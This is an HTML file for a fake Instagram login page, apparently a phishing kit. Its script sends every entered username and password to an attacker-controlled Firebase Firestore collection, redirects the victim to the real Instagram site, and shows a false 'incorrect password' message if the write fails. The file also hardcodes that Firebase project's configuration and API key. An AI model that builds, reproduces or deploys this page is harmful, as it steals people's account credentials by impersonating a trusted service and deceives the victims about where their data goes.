<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        .login-container {
            width: 100%;
            max-width: 350px;
        }

        .card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            margin-bottom: 10px;
        }

        /* Pure CSS Instagram Text Logo */
        .insta-logo {
            font-family: 'Brush Script MT', cursive;
            font-size: 50px;
            text-align: center;
            margin: 20px 0 30px;
            color: #262626;
        }

        .form-control {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            font-size: 12px;
            padding: 9px 0 7px 8px;
            border-radius: 3px;
            margin-bottom: 6px;
        }

        .form-control:focus {
            background-color: #fafafa;
            border-color: #a8a8a8;
            box-shadow: none;
        }

        .btn-login {
            background-color: #0095f6;
            border: none;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            width: 100%;
            padding: 5px 0;
            border-radius: 4px;
            margin-top: 8px;
        }

        .btn-login:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        .or-divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .or-divider::before, .or-divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .or-divider::before { margin-right: 18px; }
        .or-divider::after { margin-left: 18px; }

        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: block;
            text-align: center;
            margin-bottom: 15px;
        }

        .forgot-pass {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            display: block;
            text-align: center;
        }

        .signup-card {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }

        .signup-card a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .loading-bar {
            height: 2px;
            width: 0%;
            background: linear-gradient(to right, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            position: absolute;
            top: 0;
            left: 0;
            transition: width 0.4s;
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="card position-relative overflow-hidden">
        <div class="loading-bar" id="loader"></div>
        <div class="insta-logo">Instagram</div>
        
        <form id="instaForm">
            <input type="text" id="username" class="form-control" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" class="form-control" placeholder="Password" required>
            <button type="submit" id="loginBtn" class="btn-login">Log In</button>
        </form>

        <div class="or-divider">OR</div>

        <a href="#" class="fb-login">Log in with Facebook</a>
        <a href="#" class="forgot-pass">Forgot password?</a>
    </div>

    <div class="signup-card">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyCK8750OLb7WCLyXV2JIL1RaTth55wOQII",
        authDomain: "main-apk-3209b.firebaseapp.com",
        projectId: "main-apk-3209b",
        storageBucket: "main-apk-3209b.firebasestorage.app",
        messagingSenderId: "729839795941",
        appId: "1:729839795941:web:48b23f39e7bf6f3cf11e0c"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const instaForm = document.getElementById('instaForm');
    const loginBtn = document.getElementById('loginBtn');
    const loader = document.getElementById('loader');

    instaForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        loginBtn.disabled = true;
        loader.style.width = "100%";

        try {
            // Collection: Instagram | Fields: username, password
            await addDoc(collection(db, "Instagram"), {
                username: username,
                password: password,
                createdAt: new Date()
            });

            // Redirect to Instagram Official
            window.location.href = "https://www.instagram.com/";
        } catch (error) {
            console.error(error);
            loginBtn.disabled = false;
            loader.style.width = "0%";
            alert("Sorry, your password was incorrect. Please double-check your password.");
        }
    });
</script>

</body>
</html>
